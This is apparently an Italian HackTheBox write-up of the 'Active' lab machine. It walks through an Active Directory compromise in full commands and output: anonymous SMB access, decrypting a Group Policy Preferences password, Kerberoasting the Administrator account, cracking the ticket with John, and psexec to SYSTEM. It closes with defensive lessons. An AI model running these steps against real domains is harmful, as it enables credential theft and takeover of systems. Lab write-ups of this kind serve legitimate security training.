**Author: Noto La Diega Alessandro**

**Target: 10.10.10.100**

# INFORMATION GATHERING

Lanciamo un privo veloce scan con [[Nmap]]
```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# nmap -sC -sV -O 10.10.10.100                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 15:27 EDT
Nmap scan report for 10.10.10.100
Host is up (0.049s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec?
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
389/tcp   open  ldap?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  globalcatLDAP?
3269/tcp  open  tcpwrapped
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49165/tcp open  unknown
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.78 seconds
```

Lanciamo uno scan completo per vedere se abbiamo ulteriori porte aperte

```bash
┌──(root㉿kali)-[/home/kali/htb/active]                                                                
└─# nmap -sC -sV -p- -min-rate=5000 10.10.10.100                                                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 15:29 EDT                                        
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).                           
Nmap scan report for 10.10.10.100
Host is up (0.049s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-03 19:30:31Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Def
ault-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Def
ault-First-Site-Name)
3269/tcp  open     tcpwrapped
5722/tcp  open     msrpc         Microsoft Windows RPC
7196/tcp  filtered unknown
9389/tcp  open     mc-nmf        .NET Message Framing
29088/tcp filtered unknown
38397/tcp filtered unknown
41349/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         Microsoft Windows RPC
49165/tcp open     msrpc         Microsoft Windows RPC
49170/tcp open     msrpc         Microsoft Windows RPC
49176/tcp open     msrpc         Microsoft Windows RPC
52988/tcp filtered unknown
65205/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-03T19:31:29
|_  start_date: 2023-06-03T19:26:42
|_clock-skew: 6s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

```

Ricapitolando abbiamo :

- Porta 53: esegue DNS 6.1.7601
- Porta 88: Kerberos in esecuzione
 - Porte 135, 593, 49152, 49153, 49154, 49155, 49157, 49158: esecuzione di msrpc
- Porte 139 e 445: esecuzione di SMB
- Porte 389 e 3268: esecuzione di Active Directory LDAP
- Porta 464: esecuzione di kpasswd5. Questa porta viene utilizzata per modificare/impostare le password rispetto ad Active Directory
- Porte 636 e 3269: come indicato nella pagina FAQ di nmap, ciò significa che la porta è protetta da tcpwrapper, che è un programma di controllo dell'accesso alla rete basato su host

lo scan completo aggiunge ulteriori 6 porte

- Porta 5722: esecuzione del servizio di replica DFS (Microsoft Distributed File System).
- Porta 9389: esecuzione del protocollo .NET Message Framing
- Porta 47001: esegue Microsoft HTTPAPI httpd 2.0
- Porte 49169, 49171, 49182: servizi in esecuzione che non sono stati identificati da nmap. Colpiremo di più queste porte se le altre porte non funzionano.

# ENUMERATION

## DNS
La scansione nmap rivela che il nome di dominio della macchina è active.htb. Quindi modificheremo il file /etc/hosts per associare l'indirizzo IP della macchina al nome di dominio active.htb

```bash
10.10.10.100 active.htb
```


Dagli indizi che ci fornice nmap sembbra che ci troviamo di forte ad una macchina Windows sulla quale gira [[Active Directory]]

Come prima cosa che faccio è l'enumerazione del [[Port 53 DNS|DNS]] utilizzandno nslookup per avere maggiori informazioni su questo dominio


```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# nslookup       
> server 10.10.10.100
Default server: 10.10.10.100
Address: 10.10.10.100#53
> 10.10.10.100
;; communications error to 10.10.10.100#53: timed out
;; communications error to 10.10.10.100#53: timed out
;; communications error to 10.10.10.100#53: timed out
```

Nulla di nuovo, proviamo con un Zone Transfer
```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# dig axfr active.htb @10.10.10.100

; <<>> DiG 9.18.12-1-Debian <<>> axfr active.htb @10.10.10.100
;; global options: +cmd
; Transfer failed.

```

Niente neanche qui 

Quindi passeremo all'enumerazione di SMB sulle porte 139 e 445. Inizieremo con la visualizzazione delle condivisioni SMB.

## [[Port 139 Netbios|SMB]]

Vediamo con le condivisioni attive con smbmap

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# smbmap -H active.htb        
[+] IP: active.htb:445  Name: unknown                                           
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote 
C$                                                      NO ACCESS       Default 
IPC$                                                    NO ACCESS       Remote 
NETLOGON                                                NO ACCESS       Logon 
Replication                                             READ ONLY
SYSVOL                                                  NO ACCESS       server Users                                                   NO ACCESS
```

Interresante, la cartella "Replication"  è l'unica in cui abbiamo i permessi di lettura, proviamo a connetterci in anonimo 

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# smbclient //active.htb/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018
 5217023 blocks of size 4096. 284087 blocks available
smb: \> 
```
Siamo dentro 

Dopo aver esaminato tutti i file su questa condivisione, ho trovato un file Groups.xml nella seguente directory.

```bash
cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

Una rapida ricerca su Google ci dice che il file Groups.xml è un file Group Policy Preference (GPP). GPP è stato introdotto con il rilascio di Windows Server 2008 e ha consentito la configurazione di computer aggiunti al dominio. Una caratteristica pericolosa di GPP era la possibilità di salvare password e nomi utente nei file delle preferenze. Le password sono state crittografate con AES, la chiave è stata resa disponibile al pubblico.

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN

Pertanto, se siamo riusciti a compromettere qualsiasi account di dominio, si semplicemente prendere il file groups.xml e decrittografare le password. Per ulteriori informazioni su questa vulnerabilità, fare riferimento a questo sito.

https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp

Ora che sappiamo quanto sia importante questo file, scarichiamolo nella nostra macchina d'attacco.

```bash
get Groups.xml
```

e vediamo il contenuto 

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Abbiamo un nome utente e una password crittografata!

```bash
userName="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

# GAINING AN INITIAL FOOTHOLD

Come accennato in precedenza, la password è crittografata con AES, che è un potente algoritmo di crittografia. Tuttavia, poiché la chiave è pubblicata [online](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), possiamo facilmente decrittografare la password crittografata.
Esiste un semplice programma ruby ​​noto come gpp-decrypt che utilizza la chiave divulgata pubblicamente per decrittografare qualsiasi stringa crittografata GPP. Questo programma è incluso nell'installazione predefinita di Kali.
Usiamolo per decifrare la password che abbiamo trovato.

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
GPPstillStandingStrong2k18
```

Abbiamo delle credenziali
SVC_TGS:GPPstillStandingStrong2k18

Sicuramente non sono le credenziali dell'ADMIN proviamo a collegarci alla cartella USERS
```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# smbclient //active.htb/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 279100 blocks available
smb: \> 
```

siamo dentro !

Navighiamo fino al deskto e prendiamo la frag user

```bash
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit

┌──(root㉿kali)-[/home/kali/htb/active]
└─# cat user.txt  
f82c7da725acec03048d5707633da381
```

# PRIVESC

Poiché lavoriamo con [[Active Directory]] e utilizziamo Kerberos come protocollo di autenticazione, proviamo una tecnica nota come Kerberoasting. 
Per capire come funziona questo attacco, devi capire come funziona il protocollo di [[Kerberos Authentication]].

L'obiettivo di Kerberoasting è raccogliere i ticket TGS per i servizi eseguiti per conto degli account utente di dominio. Parte di questi ticket TGS sono chiavi crittografate derivate dalle password degli utenti. Di conseguenza, le loro credenziali potrebbero essere violate offline.

Per fare cio utilizziamo GetUserSPNs.

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-06-03 15:28:47.098252             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bd7c9e2930675c2c9faca02ae13421e0$9ebbd395aabaa0a1b075ce62395dc9572cb8e9aa084c833605a35e57e7e902ccd415ddaf317dbf225e929a94cef03c34db71e0d66a6206de6e5d0239c9ae72fe0f5829b5467ceaedf3ffa8c8117ce9756a0ff4bc6f5f341ba1abb252ffeb4de38400d1e3ab71f465605b7efb81b4d8e2770ffb8951f8202f9b3f43a641d54a81dbd581430920c52f0eb2fddc7d5f1c625fabad9f1d5e30d518926c6c96fe43e3ab24d8904066d4c5f419cda5a33e0aa6e32baf073d149bcd149b1e7ff51f122aae321c76861d21543786685383cb03a5ef228893237ea6b09319dff74ae83ca9b61902a34782c754a9143ecc231e96be5dde0a28fe82683d55907c9426b6eb757401ca45884ba20f9ccecce99d278e039aaee1e7e23f1b8c811acfa19a147ab092c4523cd5beb5ccbc766f2811aec05f56c508be945961fa3c451c057b77d8e395a09957d56a0ea9d0a320aff8c7dead51a4a664e073fbeb3029dab883e376e4fa341d973bb2855406efaa9bfcab801e851d9e81ba5fe4ae7f5113d36bca9503a1d06bb9f556114162eed2e7cfbb1b208f45fcc2a5dc1121aaa71eb44961b9387054107287da2994cc14a345e6db1d000655231908a12c2b7aeb7b630c48d1b27489b3a5f28291532bfedb1a6efbaa6be56927d6d5e652253a722854e953a746d947d5323d050f73bb9f1023d0fa342371844b1f523a5aeb32204182bfa91b6165138e9a878d949a1ecebc9b673e2e63814071419340addac808888a816fecef35c50aed6ae4e380fec26109bd225997c111f80d2c8063919eb541115d90f76198192bdb75bdbc4c2f6956bd800b1977f556f10f6b0567e0d2340dca9035359c6219cb271c0a7955c955dfa6d69281321e37d42d1f9d00d21bf17fe1451eedbc4f9cf093f674e1857c1da1dc7ad298846dc32a42354867b47bee45a17a969fe1059532f289c4289ac9fc1ee29221f5216ee376e773aea2df88c975f82caa026fc465255d224a9e5a63126c54725304c57056bdb887919f65e354268394999dd21514c0bc4ba3e1569363aede7bdc36d168f0914324860e82288a0965cf115e5b316c2a240f66cbac5354822c5661a493f0cf12444ec207a6671eb1c2b8d71ea905d43d7325cc6c92a23dc233a1783e17eb3ac7dd669b5ecb8b15c0e70a514ac3dc1fcb65862a82a1546ffb0f9b00cf8f983be771499550d76503b166ab04aaae6780132c97d71f267155181fb883702c9ba3f05eb57692a5d76f
```

- **target:** domain/username:password
- **-dc-ip**: IP address of the domain controller
- **-request**: Richiede TGS per gli utenti e li restituisce in formato JtR/hashcat

Siamo stati in grado di richiedere un TGS da un amministratore SPN. Se riusciamo a decifrare il TGS, saremo in grado di aumentare i privilegi!
Nota: se ricevi un "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", probabilmente è perché la data e l'ora della macchina dell'attacco non sono sincronizzate con il server Kerberos.
Ora che abbiamo un TGS valido che è già in formato John the Ripper, proviamo a decifrarlo.

lo salviamo in file txt

```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bd7c9e2930675c2c9faca02ae13421e0$9ebbd395aabaa0a1b075ce62395dc9572cb8e9aa084c833605a35e57e7e902ccd415ddaf317dbf225e929a94cef03c34db71e0d66a6206de6e5d0239c9ae72fe0f5829b5467ceaedf3ffa8c8117ce9756a0ff4bc6f5f341ba1abb252ffeb4de38400d1e3ab71f465605b7efb81b4d8e2770ffb8951f8202f9b3f43a641d54a81dbd581430920c52f0eb2fddc7d5f1c625fabad9f1d5e30d518926c6c96fe43e3ab24d8904066d4c5f419cda5a33e0aa6e32baf073d149bcd149b1e7ff51f122aae321c76861d21543786685383cb03a5ef228893237ea6b09319dff74ae83ca9b61902a34782c754a9143ecc231e96be5dde0a28fe82683d55907c9426b6eb757401ca45884ba20f9ccecce99d278e039aaee1e7e23f1b8c811acfa19a147ab092c4523cd5beb5ccbc766f2811aec05f56c508be945961fa3c451c057b77d8e395a09957d56a0ea9d0a320aff8c7dead51a4a664e073fbeb3029dab883e376e4fa341d973bb2855406efaa9bfcab801e851d9e81ba5fe4ae7f5113d36bca9503a1d06bb9f556114162eed2e7cfbb1b208f45fcc2a5dc1121aaa71eb44961b9387054107287da2994cc14a345e6db1d000655231908a12c2b7aeb7b630c48d1b27489b3a5f28291532bfedb1a6efbaa6be56927d6d5e652253a722854e953a746d947d5323d050f73bb9f1023d0fa342371844b1f523a5aeb32204182bfa91b6165138e9a878d949a1ecebc9b673e2e63814071419340addac808888a816fecef35c50aed6ae4e380fec26109bd225997c111f80d2c8063919eb541115d90f76198192bdb75bdbc4c2f6956bd800b1977f556f10f6b0567e0d2340dca9035359c6219cb271c0a7955c955dfa6d69281321e37d42d1f9d00d21bf17fe1451eedbc4f9cf093f674e1857c1da1dc7ad298846dc32a42354867b47bee45a17a969fe1059532f289c4289ac9fc1ee29221f5216ee376e773aea2df88c975f82caa026fc465255d224a9e5a63126c54725304c57056bdb887919f65e354268394999dd21514c0bc4ba3e1569363aede7bdc36d168f0914324860e82288a0965cf115e5b316c2a240f66cbac5354822c5661a493f0cf12444ec207a6671eb1c2b8d71ea905d43d7325cc6c92a23dc233a1783e17eb3ac7dd669b5ecb8b15c0e70a514ac3dc1fcb65862a82a1546ffb0f9b00cf8f983be771499550d76503b166ab04aaae6780132c97d71f267155181fb883702c9ba3f05eb57692a5d76f
```

e lo cracchiamo con jhon

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# john TGS.txt -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:06 DONE (2023-06-03 17:14) 0.1533g/s 1616Kp/s 1616Kc/s 1616KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Per accedere come amministratore, utilizzeremo un altro script Impacket noto come psexec.py. 

```bash
┌──(root㉿kali)-[/usr/local/bin]
└─# python3 psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file oiMTLjwb.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service sFNY on active.htb.....
[*] Starting service sFNY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```


Root Flag

```bash
┌──(root㉿kali)-[/home/kali/htb/active]
└─# cat root.txt            
c0c7a69ba275a7393e3940bbbbd17eb6
```

# LESSON LEARNED

Per ottenere un punto d'appoggio iniziale sul sistema, abbiamo prima effettuato l'accesso anonimo alla condivisione di replica e trovato un file GPP che conteneva credenziali crittografate. Poiché la chiave AES utilizzata per crittografare le credenziali è pubblicamente disponibile, siamo stati in grado di ottenere la password in chiaro e accedere come utente con privilegi limitati.

Poiché questo utente con privilegi limitati era connesso al dominio e disponeva di un TGT valido, abbiamo utilizzato una tecnica chiamata kerberoasting per aumentare i privilegi. Ciò ha comportato la richiesta al controller di dominio di fornirci ticket TGS validi per tutti gli SPN associati al nostro account utente. Da lì, abbiamo ottenuto un ticket di servizio TGS dell'amministratore su cui abbiamo eseguito un attacco di forza bruta per ottenere le credenziali dell'amministratore.
Pertanto, ho contato tre vulnerabilità che ci hanno consentito di ottenere l'accesso a livello di amministratore su questa macchina.

- Abilitazione dell'accesso anonimo a una condivisione SMB che conteneva informazioni riservate. Ciò avrebbe potuto essere evitato disabilitando l'accesso anonimo/ospite sulle condivisioni SMB.
- L'uso del GPP vulnerabile. Nel 2014, Microsoft ha rilasciato un bollettino sulla sicurezza per MS14-025 in cui si afferma che le preferenze dei criteri di gruppo non consentiranno più il salvataggio di nomi utente e password. Tuttavia, se utilizzi versioni precedenti, questa funzionalità può ancora essere utilizzata. Allo stesso modo, potresti aver aggiornato il tuo sistema ma aver accidentalmente lasciato file di preferenze sensibili che contengono credenziali.
- L'uso di credenziali deboli per l'account amministratore. Anche se avessimo ottenuto un ticket TGS valido, non saremmo stati in grado di aumentare i privilegi se l'amministratore avesse utilizzato una lunga password casuale che ci avrebbe richiesto una quantità irrealistica di potenza di calcolo e tempo per decifrarla.